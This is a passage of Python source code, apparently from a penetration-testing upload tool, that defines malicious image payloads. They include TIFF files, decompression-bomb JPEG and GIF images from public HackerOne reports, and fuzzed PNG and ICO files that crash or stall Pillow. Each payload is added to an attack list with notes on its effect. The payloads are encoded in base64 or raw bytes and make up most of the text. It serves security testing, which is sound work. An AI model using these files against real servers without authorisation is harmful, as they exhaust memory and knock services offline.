                      "/4D///N/+Cn6SKv3///kEiH//6//4///8Z/4f/giAPf9/wBAgD//X//1///hf/j//gAIi8AHAAgln/9///3///D/+H/+BAADwAASIgAf/z/" \
                      "/////8V/Y//8IQAMAQQSAlJP8Hf/////Butj//w/QAAEAIBQACeM3/////8Pv+P//GrwEBAAABQIExr///+//w2t4//4f/gyAiAQAlJAGG/" \
                      "////+C+vj//D3/CAgAAAIAQqeP/////4f3+P/8H/8MABBCgEkIDCf/////h/74//x//RCAAOBhEJAQP/////4Hffj//b/8NAAD6AgCAgPP/" \
                      "////AvXeP/g//wAAAPhACIAiHf////8Bv34P+Nf/HgCF8AoCCgAD/////gPX/hrwn/wQADwP/7/Xf78AAAAP/gKAKE9AB993/Q7f737q14A" \
                      "AAAf+aAAgDoA/+//oO//36W21gAAAB/8KACgGEf/99/Q/Wf7////AAAAP/wQAMgaAf/v/+H7/v39v26AAAA/+xAAAAQH/93/4P53d1vW94A" \
                      "AAH/4SACgDB//f/9j/97d2rv+oAAGP+BIAIEIP+/7/wN79///32fgAA+HwBaAiAQ/9//+gf9v+an1urgALUAEAACgKH/9//8H/vvv/1//zA" \
                      "MyRGABAORf/6///AXv21227a/aD8wQAAEAAD//P/+9D/159/93+r8vuAAAAACov/43//wGf8G/r6u+6/9WQAAAAIH//H+//A/1/P32/ut//" \
                      "/oQAAAAkP/8d//4A/38X79crdW/6AAAAACg//y//+UGf1d77fDgc//1IAAAAAAH8D//8AfX77312ABX//mAAAAAAAfwv//MA/71u69wAHH/" \
                      "9AAAAAAAA/A//8AGf2e9v7AAYd/4AAAgCAAB8r///ADf/d/W4ABkv+UAAAAAAAPgH+ymAPdp3/6gAFX/5AAAAOAABcKPwREAfvTdt/AAb6/" \
                      "5AAACkAAH4E+HUgAb8f++0AB6v/KAAAYAAA/ih4AUAB90V+egAK/v+AAAbaAAD8UHGAgADsB+v+AB+r/6AAA+AAAPwAMKEAAP8F/2uKss7/" \
                      "oABPhAAH/AAiIAAA/wH+uhWvwv8AAA0KAA/8VAIAAADcAt//6uWCflAAHAgIB/xEAAAAAHcB9+X9XcL/kAAYBAxr/AAUAAAA3AG/f5f/gv9" \
                      "AABAACUB8CAgAAAAuAf7/tV0A/6AAAKoLmn5QIYAAAPeA/+rv9wL/2AAB0AigfAI4QA//Bf8EAEYA/ACX//x/h5UDZ3////+Q/6BJUGn5AC" \
                      "t//JuB5APtt7///5T/AEIABfAAEn98P4HiAXZN////gRRAEGlj+AAB3f/FgAAClrv///+EKSCwIA/gAAAH//uAAANoHr///4CWz/wJT8IAA" \
                      "f//9YAAABAV////iAZN/AAfmAAD////AAAAIA+f//8BMKD8Ka9AAAf///+AAAAAOv///4BBQDwil9GAD////IAAAAA/3///AAqYfkAtAYAP" \
                      "////AgMAACv7//+CmUB/AFoJgA////8GQAAAPa///4AAGv8CAEAAD////oeMAAAfv///AAIQfwIIgAAP///8DbAAAD3wAhA+hMh/BCEAAA/" \
                      "///0FkAAAP2///wEAiV+AFADQD////A8wAAB/////ACQTf4Hngf4N///4hsAAAH7///8AAB+/wp/Dew////gEgAAAP+///gAAF+/BHeX/tv" \
                      "//8A0AAAB9////AAA3v8E/+f8H///4AAAAAH////8AAP/P4if//4N///GCAAAA+7///wAD3//kH///wf///gUAAAD////+ACBf3/ZH//+Bb" \
                      "//8CgAAAH3///4G+EPf9jX///A/3/AEAAAA/////hs+Aa/+n/Z/8FIs4AQAAAD////8C/sAP/yfJ//gOYKQAAAAAH9///gf/wD//OQHf/BK" \
                      "AgQAAAAA////+G//gFf/zAX/8AAAAIAAAAD///DYR/+g//94D//wAAAAAAAAAXv///D///D//2Af//AAAAQAAAAA////8J38eL///CL/8AA" \
                      "AAAAAAAB////w1b8O7//4n//wAAAAgAAAAP////C//4fv+PEr//AAAAIAAAAA////8P7/wn//0FX//lAAQAAAAAH3///z+21///eQf//gAA" \
                      "AAgAAAAf///8Pl1Hb8Ddf///AAAgCAAAAA////wf/b4R8Sv/BKAgAAFYAAAAH////B+X7f/wX//v/wAAADgAAAAP///4Of67X/yrv//+AAA" \
                      "IuAAAAC////w9Vr+3/1////8AAIT4AAAAH///+Fvd5f/+Kf///wAAAPgAAAA////gZrqv//67////AAAS+AAAAB////Aq6/Zv/l3///8AAA" \
                      "H4AAAAH///0Fd1e///JX///wAAC/gAAAAv///grVdfX//V////AAJA+AAAAD///8BbvP6//wp///8AAAPwAAAAb///wCrrlf//pf///wAAk" \
                      "/AAAAA7///Ar/md938Ke//+AAQj8AAAAD///7ARLnM//pXd/v4AAEc4////gAAAH+QIERIA9UwhAf//9Gj///+gAAB/u+pWSIpasAAR///Y" \
                      "OP///4AAAH/JJLXASXpFgAH//3h4//+vQAAAD/f7qhkip5ggk///6nj///+AAAB/765fkUVlQCAB///8+P//n6AAAD/599RIEmq2iQf///P" \
                      "4////AAAAP/v91YqF2tQIA///2vj//1+BAACP+pem4BqlJdFj////+P///0AAAb/1xdtapZqQAEP///p4////AAAEH/97paIH5SplB///3/" \
                      "j///9gAAAf/7PbbDeqqRIL////+P///wAAQH//TaTSQuVahEP////4///+AAAAX/+265kf/KOgA///6/j///5AAAA//0N09EebaCSP////+" \
                      "P///wAAAL//7dXKxvXZEAP////4////gAAAf/+2eH0bqyqGg/////j///5AAAA//972rEV2tqAL////+P///gQAAD//121Wl9qRQhf////4" \
                      "///+AAAAP/96en4G6yQEg/////j///xAAAD//969m2d4lmID////+P///kAAAP//tX9WntaSABf9///4///9IAAA///ubrdn3UioB/////i" \
                      "///5AAAD//+/7VleqiQQn////+IHf+AAAAP///H6+r/VoUEf////4iaf4hAAA///57lNWrhGGL/////gAXfgQAAH///91rq/zqpAP////+A" \
                      "A2+AAAAf///X6+N/uYGI/////4AIv5oAAB///+2VOv/6NAH/////gAF/IAAAP///9+ql//6BA/////+AAB+KAAA////VtVp/7WyL/////4A" \
                      "APxAAAD/////FKv/9Uyev////gAAuYgAAP///9fnV//+IB/p///+AAF8gAAA////3smV//qiv4P///4AAH5QAAD////3puv/5Ix/cD///gA" \
                      "A/lAAA////+f5b//6if+AK//+AAP9hgAD/////++f//6j/4ATX/4AB/8gAAf////P1////2/+AABf/gAD/7kAB/////v/v///4TeAAAf+AA" \
                      "AAAAAH///////////gH0AAAP4AAAAAAA///////////+APgAAAPgAAAAAADb//////////5P7AAAE+AAAAAAAAF//////////8/2AAAe4AA" \
                      "AAAAAAAD///////////lAABdgAAAAAAAAAD//////////7/6AD+AAAAAAAAAAC///////////////4oAAAAAAAAAA//////////93+fxDgA" \
                      "AAAAAAAAAH////////9//d8AOAAAAAAAAAAAP//5/////////YAwAAAAAAAAAAA//////6+f///xADQAAAAAAAAAAD//v///Y//b+34AIAA" \
                      "AAAAAAAAAIH//v/IB//n//AAgAAAAAAAAAAAAP9bv/gD/8+9wACAAAAAAAAAAAAAP7z/0AP/z/9UAAAOAQAAAwAAAAEMnQAAAQEAAwAAAAH" \
                      "2lwAAAQIAAwAAAAEAAQAAAQMAAwAAAAEAAwAAAQYAAwAAAAEAAAAAAQ0AAgAAAP8AAAyCAREABAAAAAEAAAAIARUAAwAAAAEAAQAAARYAAw" \
                      "AAAAEBmQAAARcABAAAAAEAAAvMARwAAwAAAAEAAQAAASkAAwALAAIAAAABATEAAgAAAEEAAAyYAUIAAwAAAAEAAQAAAAAAAG1pbmlzd2hpd" \
                      "GUtMWMtMWIudGlmZgA="
            content = content.decode("base64")
            file_details = "The image is TIFF image data, big-endian, starting with the MM file magic"
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_im + file_details))
            if orig_filename or orig_ct:
                attacks.append(("bigEndianGraphicsMagick.tiff", content, "image/tiff", new_title, desc_im + file_details))

            content = 'SUkqABAAAAABAAEAAVYBwgsAAAEDAAEAAAABAAAAAQEDAAEAAADw/wAAAgEDAAMAAACaAAAAAwEDAAEAAAB0hwAABgEDAAEAAABMgAAAEQEE' \
                      'AAEAAAAIAAAAFQEDAAEAAAADAAAAFgEDAAEAAAABAAAAFwEEAAEAAAAIAAAAHAEDAAEAAAABAAAAUwEDAAMAAACgAAAAAAAAABAAEAAQAAI' \
                      'AAgACAA=='
            content = content.decode("base64")
            file_details = "The image is TIFF image data, little-endian, starting with the II file magic"
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_im + file_details))
            if orig_filename or orig_ct:
                attacks.append(("littleEndianGaphicsMagick.tiff", content, "image/tiff", new_title, desc_im + file_details))

        if injector.opts.file_formats['jpeg'].isSelected():
            content = '/9j/4AAQSkZJRgABAQEAFgAWAAD/2wBDAAICAgICAQICAgIDAgIDAwYEAwMDAwcFBQQGCAcJCAgHCAgJCg0LCQoMCggICw8LDA0ODg8OC' \
                      'QsQERAOEQ0ODg7/2wBDAQIDAwMDAwcEBAcOCQgJDg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg7' \
                      '/wAARCPr6+voDASIAAhEBAxEB/8QAHgAAAQUBAQEBAQAAAAAAAAAAAAECAwQFBgcJCgj/xABOEAACAQICBgUIBQgHBgcAAAAAAQIDEQQhB' \
                      'QYSMTJRByJBYZEICRMUcYGV0hUjM1KhNEJiY4KDksEXGSRDRXKTGCU2VHXCRFNzsdHh8P/EABoBAQEBAQEBAQAAAAAAAAAAAAACAQMEBQb' \
                      '/xAAgEQEBAQACAgMBAQEAAAAAAAAAARECMQMSEyFRBBRB/9oADAMBAAIRAxEAPwD7YAAH6B8sAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
                      'AAAAAAAAA1uzAV8JG+Ec3dDWroCSHGTw3FeO+5YisgHAAAQWfIQsDPz/eBHZ8gs+ROAEFnyCz5E4Bkuq4Er4hAvEYtnyHj1whlmIbPkFny' \
                      'JwCNQWfILPkTgFILPkFnyJwAgs+QWfIk8c2NyaXB0PuANQWfILPkTgGy6gs+QWfInANQWfILPkTgBBZ8iJ32vay4AFSz5BZ8i2AFeKyROu' \
                      'EUAAAABE7oLda9wXCKAAAAAAARDHxCCviEDtOgPXCMHrhDKUAAOIAADoAAAAAAOYAAAAAAqAAAKAAAAAAAAAAAAAAAAAAA8c2NyaXB0Pi5' \
                      'BlyQAZAZckAAdIAAAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARZoAADPUAABUgAACgAAAAANl2EXkHAQttPexU21vZu' \
                      'iUBl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zAaHgAE8c2NyaXB0PgAAAAAAAAAy9AG' \
                      'y7Bw2XYcb2InxDlwjXxDlwlhQAAAAAAAAAOwTaQPhGBUh+0guhgdgbkSANjvHBAAAAS6Aa+IAJLsLsbdCgLdhdiAAt2RucknmPI2mkAnpJ' \
                      'cx+1LmRtZK3IcBLFt7yRK7Io5byWLV7lQINbaY4a02ygqd0KIlZCgAABmQNcIvsF2VyC6C6GQFkI0kgcl2PMRu4yBHlcjcnbeSPcyJ8Joj' \
                      'c5KW8PSS5jWusIdJI6yTT9uTdmx12RJ2kJKdt7Lsn4rIWdVrtKNXFVIJ2ml7iHEYpU07tXOXxul4wUuskV6x2kjVxOlsVRUtislbuORx+t' \
                      'emKEJOljVGy+4jndK48c2NyaXB0PvK9Na5UoRmnUW7mc+Xripwn46LT/Shrjgtr1bS6p2/Uwf8AI8T090+9KWCU/VtZVTtu/ssH/I5bWbX' \
                      'KnLb+sXb2n8+6ya1U5up11f2ng537+nT04/j1PF+VD0108dOFPXFRgty9Sp//AAB/JOM09F6Qm1JWPHNjcmlwdD7RWOj2nwwxPnFun6k+p' \
                      'hNV7d+i5fOZNTzkflC027YPVb4VL5zp8vFxvg5PvOB8C5+ct8omN7YPVT4TL5yhV85t5RsE2sHqnf8A6RL5x8vBF/n5v0BiNXPz1VPOg+U' \
                      'lGTSweqVv+kS+cqz86P5S0VlgtUfg8vnM+bgz4PI/Q9s5DT87z86X5S6X5Dqh8Hl85FPzpflL/wDI6ofB5fOZ83Bs8HKv0UR3Eq4T85/9a' \
                      'd5TC3YLVH4PL5xP61PymUssDqf8Hl85U8/Bf+byWfT9GQH5x5edW8pxbsDqf8Gl85BLzrflPL/wOp3waXzlTz8EX+fyR+j8D83q8655UD3' \
                      'YDU74LL5xV51vyoL54DU74NL5zfm4sn8/kfpBEfCfnPoedS8pyqlfAan+7Q0vnNmh50HylattrA6o5vs0PL5y55JT/P5H6E27ITayPgVh/' \
                      'OW+UZVaUsFqp7tEy+c3sP5xryg6qW3gtV/douXzle0TfDzfdS6uKmrnxEoecH6eqkbywmrXu0ZL5jQh5f8A07NX9U1b+GS+Y2WN+Hm+1Y1' \
                      'cbPix/t/9Ov8AyurfwyXzEcvOBdOyllhNW/hkvmNljPi56+1Ns/YHtPidPzg3TwnlhNWvhkvnKs/OE9PSvbCatfDJfOdJzkdJ4uT7a1JpI' \
                      'zMRiYxTu0rd58Up+cF6eJuzwuraT5aMl85A/Lv6b8RBupQ1fV+WjpL/ALh7xU8fKvsLpbSkKcX10rd55NpzWFU1U+s/E+YeJ8szpfxsPrq' \
                      'WhFf7uBa/7jktIeVF0m4zbVWOi1f7uFa/mPd3ni5R/emtGuCpuo1V7OZ/OmsmvkozklWfb2n8uaT6ctd8epen9Sz+7Qa/mcBj+kDWDGyfp' \
                      'nQz+7Ta/mcby2Ok4V7np3Xqc/SfXPxPItLa4Tq1Kn1rzfM4CvprHYlv0slnyVjKqQddvblLPfZnm5S62ytuvrHJ4mT9I/EDnHoyhJ3c6l/' \
                      '8wEZWZUWLxiuzDrYlO+ZmYjGtreZk8VK7zPE7tOrXTuZ1ae0mVXiG5bxim32smitVj1+0qVIckabhd7yKVPIllmsidN23MrTVma1SGTM2r' \
                      'G17FSJnajLLnkQuW8lle7z3FSd7tbi5NddK7t8xPQ7fYSUqbk1vzNjDYRySyLkZbrKp4KUlknn3GlQ0PObVoPwOu0forb2ere53mjdARnF' \
                      'dUqMeb4PQFW8eq8+46zCavVLLqvwPVtH6tRajen+B2mF1Xp7KtTPVxHj2F0FUi45Zew6TC6InFcL8D1aGrtNW+r3dxbjoSEN0To5Wfbz7D' \
                      'aOmoZpmnHBNQO0jo2KVtkV4CK/NLnRbji/U3y/ArVMK7s7mWCjl1SrVwSTfVNc7NcHVwru8ijVwzT3PwO6qYNWeRm1cHnZLcGuNeHan7O4' \
                      'tUqPU3G1PCWnmhY4a3YFce1GNLIinQ35Zs3I4a8VkP9UTdrPwDrenKVMLLZ5mdUwsnfI7yWCSjuKM8CnfI5tcO8K08/8A2G+gafb4HWywc' \
                      'U9xRnhkpbiLWWawvRPvA1XRW12Ac9pkeb19V6EY39cqtv8ARRmVNX6NNv8AtNSXtijusTwruMPEPrNHG8Y521yNTRdOm3ao37ipOjGlubd' \
                      'jfr72Y1eO852SukusyriHCGUPxKM8fJL7NeJarwbTMudJ3ZFkaSpj5W+zWfeU54pylnFZ946dO6IZUmGZEU6+b6i8SL1hLL0SfvJHSuyGV' \
                      'J7bI2tT08eqcl9RCXtZp0NPOk8sHTf7TMF0usKoZm+1HdYfXWth7bOjaMrc5yN/DdK2MwtlHQmGlbnVkeVdgx8Rs5coPHNjcmlwdD5oDCO' \
                      '362RtUvKA0vDdq7g/9aZ/OkOItR3oqeTnP+j+i15QemW/+HcH/rTH/wBPmmHn9AYTP9dM/nZSzLMZ5FfLz/WySv6A/p40u/8AAcJn+umC6' \
                      'ctLNZ6Dwv8ArTPBFOyRLGoL5ef6qcONr3qPTVpWSu9CYZfvZEkemLSdR56Gw2f62R4ZSqLZRcpVFkbPLz/UXjHtsOlPH1t+iaEb8qkizHp' \
                      'DxU9+jaGf6cjxuhVsa1LEKyXaX8vL9T6x6ktdsRUV3o+kv22JLXfEQWWj6Tt+mzzyGIWyFSunBj5eX6esdzPpCxVNXWjKD/bkUavSljqf+' \
                      'D4d/vJHAV6yZj4ionexl8vL9U9Hq9L+kI3S0Lhn+9kZ1Tph0i0/9yYa3/qyPL6r675GdU3M5fJz/R6jPpe0i8/obDZ/rZFWp0saQf8AhGH' \
                      'X7yR5ZLcRS7DPfl+j099KOPbv9FUP9SQHlwG+3L9H9G4h3bMPEO83yOYqa/UajutGzX71GbV1zpTu/UJr94jpeccrL26Kt2mdVjdbkYc9b' \
                      'KUk/wCxT/jRWlrPSb/I5/xoj2i5WrVpXlmsijOknIqy1ipOX5LP+NEf03SefqzX7RNsbsTyo/gQyoXftI3pim3+Tu3+Yj+laf8A5Dv7SbY' \
                      'bDpYfPuK06LU2iR6Tg/7p+JG8dCT+yfiSbFaVNp7iGUeZadeMnwtDHaS3WBsVGuwLLkWPQ3z2vwD0H6QNiurX7iRPkSeg/SFVFr878AbDF' \
                      'Ky7SaNTMZ6J80Js7L33CpYkdS0hyrZEDV3vE2WFTlGlSq9W5bhWzMVT2Va1xyxSg+Fv3myptjpaWJsXoYvcchHSEYv7N+JKtKJf3b8Stid' \
                      'js44zNZ2CeMy3nF/TKUvsX/EL9NJq3oX/ABDYbHU1MTdMpVaza7jD+lVJfZPxD6QUl9m17xbFSWrs5K5Vm7iKtt9lh2xtPfYgyq0v5kUuw' \
                      'v8AqrkuNL3DZYN2+0/AGVQAtPCyvxLwAMUrMY45MtKIOF12Bl6UXHJkTVi9OORWkrK1gg0fdEUtw3az3gWAIFN/esP2u8CQVOzI9rvG7Xe' \
                      'BOm7kqmU9r2kimrgXYyyJOwqRll2kqlkBMBGpNoW7AeR9gt2IBGBJZcgsuQELXaQyV0/aWWt+WRE12AQWYnaTNchj3MCq+IQdPK7IHJ3DP' \
                      '+rEZWyLEJ2sZ7qZCKtms2HWVu06iLUaqsYEa65k0a+Ts7hdrooVUkPdVPtRhwxGW/InjX2nvCbdaG33AVdp8wDEaTTEdSK33JdnIr1IO+Q' \
                      'DJ1IvdcilFy3bxdh3JVFoIsxWeFqS3NDlo+vJZSgveXUu0sxeQYyvo+unnKD9414WrHe45d5st3RXmnc2TRmPD1Lb0I6FR5XRfcchts0Vk' \
                      'XkUvVKje+I9YWqnxIvJdZjhjLFL0U4rNoVNonlmmRNZjIkqnZD9ruIrMclYZBKlJ8h2ywj2j1xGWBNh8xuyyYZZnPRE+1Ddh78iRp3YqVj' \
                      'pIIJRa9xXm0r3LkkynUi8zcjZNVZzj3lac4bXaTTg1crSg1NGWMv0lVN1HaNlfmTx0XXmrqUPexKEbNXNujUSiSjay1onE7N9uHiPWisV9' \
                      '+n4m6qisPvdZBUtYa0biY/nw8SxT0diU+OHiapLF7graorR2J2eKHiBtRa2EANrK9GuZHKlkaCwtftgvESVGcU7xSC2X6Jb+0HTy3WLkko' \
                      '70RtxccmE1U3McpNEjjdjXRm1kl4hmUifWHbN4iww9Xa3K3tLUMNVcOFeJUJNU3Gy3Ij2e41Hg61uBeJE8JV7Ype8pbPluG3fMs1KFSO9f' \
                      'iVX1XmZsZegFu4VOJIkmrmoQ2VxR8pRj2kEq1PLrfgZsEhKuIpvEUl+c/AesVRbyk/AXoXo2t2C2RXhiKctzfgTqpB9v4HKShHHPcJZciT' \
                      'bhb/6GOcf/wAjrOhG14Ecqd1e2RK6tPm/AX0tK1tp+BrZ2pSo3vlkVZUknmjY26byvl7CN4aVRvZV7k2xnJjrqv2FiFVIu/ReKqcFNO/6S' \
                      'FWgNKN9Wiv40SjKZTrXazL0J9UihoLSlPOdGKX+dE6wWKprrQS/aNytkulv3/iPg7MYqNRLNLLvFUZ9oyryrW13sCvtd4DKZXQlStFu9iz' \
                      'F3ElG6ujFsOpFuViBxd9xrTpdxXlTt2AUUuZKuEe4cw2e8CSnvRep8BRhkky7TeQFj8z3FefETX6thjimmBm11dPmZNWL29xuVY3zM2rDr' \
                      'bgKcI9bMmXAxFCz5DmkosIv2q1OFlGStLuNCeaZUlHL2kXtilPiCHGSVIq5CuI7Rc6XqTyLsJKxnwfVLcJZGpvayI+EbdhdhiGW4a+Ie12' \
                      'MNnO9jKHw4jSo8SM+OTL9J5qxxo2MO80bdDs9hg4eWa5nQYWzgm95YfVT9GY1aLuzoakU6e4yqtO7eR0dGE4tNkLXVNCcLSeRSnHIqCq97' \
                      'AdZAUNOGMw/bWiix65hGrKvE5EfT+0RzvGMvTqXWoNZVE7kM50WuNGZT3IkluJxmpZ1KX30mRupBrKaZSqcTGQ7BjZdaUWmt6LEJLtdilH' \
                      '+ROMauKpBR4kM9LDtmiq+Eil2DE6tTqU3fropz2XLJoY+IQqcYabKKW7cQSV3kTt9hC95vrEoXCTvZNkboVHHKDLkH1l3lqO5E3hOxgzwu' \
                      'Ib+ydiv6nir5UJHUy3BHcJMVrno4LGNZYebLcMBjVH8nnl3HSUeJGjH7Mbhm/bkPVMUl1qMkDw1dP7JnUVFdoqzWbHtTHPvD1rfZsPQVtn' \
                      '7NmzK+zkNa7GO4YylRqW4GTwjKNtpW5loZPcTYYno1qcLbU0jew+kMHCmlPEwi13nIT4iF32zDHoT0po1xt63T9lynU0ho9v8qp+Jw0lmM' \
                      'luK1Tq6uLwTbccRB+xmdPEUHuqowgEtGo61K/GgMsDfaiV7x0PtEAHS9MvTQp7kPlwABCFSp2jI9gAFxehvsTreABpH2kUwAOaF8Q17gAu' \
                      'Bst3uK7k0gA0LTbui7F9ZIAMvQkfCEQAgXqW9F6MnsABF7XOjZpNFeazYAY1BLcRS3gBc6DbIilvABehXlvsRS3gBAhnvGSS3AACbKGAAD' \
                      'dpgAAf/2Qo='
            content = content.decode("base64")
            desc_im2 = desc + "The file was taken from a public hackerone report on https://hackerone.com/reports/390 " \
                              "(lottapixel.jpg). The file seems to exploit missing bounds checks in ImageMagick's " \
                              "identify command used by the Paperclip gem in Ruby. The image header says it is 64250 in " \
                              "width and 64250 in height. This means if one byte is allocated per pixel, 4128062500 " \
                              "bytes will be allocated, which results in memory exhaustion. It is therefore very likely " \
                              "that the server is running an outdated version of ImageMagick or GraphicksMagick or is " \
                              "simply not restricting ressource allocation properly."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_im2))
            if orig_filename or orig_ct:
                attacks.append(("lottapixel.jpg", content, "image/jpeg", new_title, desc_im2))

        if injector.opts.file_formats['gif'].isSelected():
            content = 'R0lGODlhAQABAPAAAH9/hwAAACH5BAAAAAAAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAAQABAAACAkQBACH5BAAAAAAALAAAAAABAAEAAAICRAEAIfkEAAAAAAAsAAAAAAEAAQAAAgJEAQAh+'
            content += 13332 * "QQAAAAAACwAAAAAAQABAAACAkQBACH5BAAAAAAALAAAAAABAAEAAAICRAEAIfkEAAAAAAAsAAAAAAEAAQAAAgJEAQAh+"
            content += 'QQAAAAAACwAAAAAAQABAAACAkQBADs='
            content = content.decode("base64")
            desc_im2 = desc + "The file was taken from a public hackerone report on https://hackerone.com/reports/400 " \
                              "(uber.gif). The file seems to exploit missing bounds checks in ImageMagick's identify " \
                              "command used by the Paperclip gem in Ruby. The image is composed of 40k 1x1 images. " \
                              "This usually results in memory exhaustion or another server side timeout. It is " \
                              "therefore very likely that the server is running an outdated version of ImageMagick or " \
                              "GraphicksMagick or is simply not restricting ressource allocation properly."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_im2))
            if orig_filename or orig_ct:
                attacks.append(("uber.gif", content, "image/gif", new_title, desc_im2))

        if injector.opts.file_formats['png'].isSelected():
            content = 'iVBORw0KGgoAAAANSUhEUgAAnCAAAAAgBAMAAABSWQRUAAAAElBMVEX///////////8AAAD/AAD//wB+tBpvAAAAAXRSTlMAQObYZgAAAAF' \
                      'iS0dEAIgFHUgAAACfSURBVCjPfdHBEcMgDETRTEpIBcnfDrRUYFRB+i8mB7BsOIQT82alQeLx5vX8cJ3HeVHIC7QelbDDzoSYEIDS9gotW' \
                      '/8HhLwCKL0C1gbIt4cBzIRmwidE4CUx3nHcSgzwBTlG4mwSBZ4bqX3Ith0qCHVoHapHy1B2aha1zMyMqB45gEpsYA842Epu4MyWvj5KY0L' \
                      'twA7XLNjWaLHuVOAH7HBQQpH5l3oAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAHBQQ' \
                      'puxU4EAAAAJSURBVAAACxIAAHBQQpuxU4EAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxI' \
                      'AAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAHBQQpuxU4EAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBV' \
                      'AAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSAe6P6Z0AAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSQgFa+bcAAAA' \
                      'KSURBVAAACxILEgHVfvzLRAATAAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQDAAAACklEQVTG5kw1AAAACUlEQVQAAAsSAAALEkIBW' \
                      'vm3AAAACUlEQVQAxcl5Re5BjpETPW6DAAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAB' \
                      'wUEKbsVOBAAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAALEgHuj+mdAAAACUlEQVQAA' \
                      'AsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAALEkIBWvm3AAAACklEQVQAAAALEgAACxJCgKuXlgAAAAlJREFUAAALEgAACxJCAVr5twAAAAl' \
                      'JREFUAAALEgAACxIB7o/pnQAAAAlJREFUAAALEgAACxJCAVr5twAAAAlJCxJ+/AAA'
            content = content.decode("base64")
            desc_pil = desc + "The file was created by floyd during an offline fuzzing run with the Python Image Library (PIL/Pillow). "
            desc_pil += "It usually leads to a Python exception of:<br>broken PNG file (chunk b'\xe5\xe6')<br>"
            desc_pil += "Our test server then returned an HTTP 500 error."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_pil))
            if orig_filename or orig_ct:
                attacks.append(("pythonImageLibrary.png", content, "image/png", new_title, desc_pil))

        if injector.opts.file_formats['ico'].isSelected():
            content = '\x00\x00\x01\x00\x01\x00  \x10\x00\x01\x00\x04\x00\xe8\x02\x00\x00\x16\x00\x00\x00(\x00\x00\x00\x01\x00\x00' \
                      '\x00@\x00\x00\x08\x01\x00\x18\x00\x00\x00\x00\x00\x00\x01\x00\x01\x00\x04\x00\xe8\x02\x00\x00\x00\xe8=====' \
                      '=====================================================9====================================================' \
                      '========================333\x0333\x03333333330333\x0333\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb' \
                      '\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb' \
                      '\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb' \
                      '\xdb\xdb\xdb\xdb\xdb'
            desc_pil = desc + "The file was created by floyd during an offline fuzzing run with the Python Image Library (PIL/Pillow). " \
                              "On my machine this takes more than 25 seconds to process. The .ico image routine seems to be used in Pillow 4.0.0."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_pil))
            if orig_filename or orig_ct:
                attacks.append(("pythonImageLibrary2.ico", content, "image/vnd.microsoft.icon", new_title, desc_pil))
                if orig_ct:
                    attacks.append(("pythonImageLibrary3.ico", content, "image/x-icon", new_title, desc_pil))

        if injector.opts.file_formats['tiff'].isSelected():
            content = 'II*\x00\xa0\x00\x00\x00\x80?\x01P8$\t\x86\xc0\x82\xd6\xc2\x83\xf8\x1b\xc0\x06\x00*\xbf\xe1\x8f\xf7\x9b\xfd\xf7\x00' \
                      '\x00\xf9\x00\x00\x00\r\x01\x02\x00\x08\x00\x00\x00\x9f\x01\x00\x00\x11\x01\xe5\x00\x01\x00\x00\x00\x08\x00\x00\x00' \
                      '\x122\xf7\xfb\x0e\x06\x0f\x9a\x0c\xde\x109\xa4l\xfe\xff\x9aL\x97\xef\xc0\x1c\t\xf9\x1a\xa2\xc5\xa5\x93X#\x00\x00' \
                      '\x00\x1eA\x07\x84\xf7\x89>R\xfc\x18\x94\xd8\xa4\xfa[\xcd\x82U*\x94\xe2o\xf6-\x80\xa7\x03y\xd9l0\xd6-\x80\xaf\x04' \
                      '\xb5[\xe6%P\xa8\x02\t/\x1f\xbf.\xf1(-\xe2S\x02x\x00\x18\x14\xb8L\n\x02\x12\x00\x00\x01\t\x00\x01\x00\x00\x00 \x00' \
                      '\x00\x08\x01\x01\x01\x00\xe5\x00\x00\x00 \x00\x00\x00\x02\x01\x03\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x01\x03' \
                      '\x01\x01\x00\x00\x00\x05\x00\x00\x00\n\x01\x03\x00\x01\x00\x00\x00\x03\x00\x00\x00\n\x01\x03\x00\x01\x00\x00\x00' \
                      '\x01\x00\x00\x00\r\x01\x02\x00\x08\x1f\x01\x00~\x01\x00\x00\x11\x01\x04\x00\x01\x00\x00\x00\x08\x00\x00\x00\x12' \
                      '\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x15\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x16\x01\x05\x00\x01' \
